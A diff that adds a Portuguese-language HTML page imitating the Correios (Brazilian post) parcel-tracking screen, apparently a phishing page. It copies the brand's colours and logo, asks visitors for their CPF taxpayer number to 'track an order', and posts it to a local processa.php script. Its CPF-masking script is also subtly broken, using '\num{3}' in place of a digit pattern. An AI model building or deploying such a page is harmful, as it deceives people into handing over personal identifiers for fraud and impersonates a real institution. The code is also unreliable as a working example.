@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Rastreamento - Correios</title>
+    <style>
+        /* Configurações Globais */
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            background-color: #dbdbdb; 
+            font-family: 'Arial', sans-serif;
+            padding: 20px;
+        }
+
+        .card {
+            background-color: #ffffff;
+            width: 100%;
+            max-width: 340px;
+            padding: 30px 20px;
+            border-radius: 10px;
+            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.4);
+            text-align: center;
+            border-top: 5px solid #00416B;
+        }
+
+        .logo {
+            width: 150px;
+            margin-bottom: 25px;
+        }
+
+        h1 {
+            color: #00416B;
+            font-size: 18px;
+            font-weight: bold;
+            text-transform: uppercase;
+            margin-bottom: 12px;
+        }
+
+        p {
+            color: #555;
+            font-size: 13px;
+            line-height: 1.4;
+            margin-bottom: 25px;
+            padding: 0 10px;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #d1d1d1;
+            border-radius: 4px;
+            font-size: 15px;
+            margin-bottom: 15px;
+            outline: none;
+            transition: border 0.2s;
+        }
+
+        .input-field:focus {
+            border-color: #00416B;
+        }
+
+        .btn-track {
+            background-color: #FFCE00;
+            color: #00416B;
+            border: none;
+            width: 100%;
+            padding: 14px;
+            border-radius: 6px;
+            font-size: 15px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background 0.2s;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        .btn-track:active {
+            background-color: #e6b800;
+            transform: scale(0.98);
+        }
+    </style>
+</head>
+<body>
+
+    <div class="card">
+        <img src="https://miro.medium.com/1*RpaJjaK0hdtXjgR4oDYgTQ.jpeg" alt="Correios" class="logo">
+
+        <h1>Acompanhe seu pedido</h1>
+        
+        <p>Para acompanhar seu pedido, preencha o campo abaixo com os dados fornecidos durante a compra.</p>
+
+        <form action="processa.php" method="POST">
+            <input 
+                type="text" 
+                name="cpf" 
+                class="input-field" 
+                placeholder="000.000.000-00" 
+                inputmode="numeric" 
+                maxlength="14" 
+                id="cpfInput"
+                required
+            >
+            <button type="submit" class="btn-track">Acompanhar Pedido</button>
+        </form>
+    </div>
+
+    <script>
+        // Script para máscara de CPF automática
+        const cpfInput = document.getElementById('cpfInput');
+
+        cpfInput.addEventListener('input', (e) => {
+            let value = e.target.value.replace(/\D/g, ''); // Remove tudo que não é número
+            
+            if (value.length > 11) value = value.slice(0, 11); // Garante apenas 11 dígitos
+
+            // Aplica a formatação 000.000.000-00
+            value = value.replace(/(\num{3})(\num{3})(\num{3})(\num{2})/, "$1.$2.$3-$4");
+            value = value.replace(/(\num{3})(\num{3})(\num{3})/, "$1.$2.$3");
+            value = value.replace(/(\num{3})(\num{3})/, "$1.$2");
+
+            e.target.value = value;
+        });
+    </script>
+
+</body>
+</html>
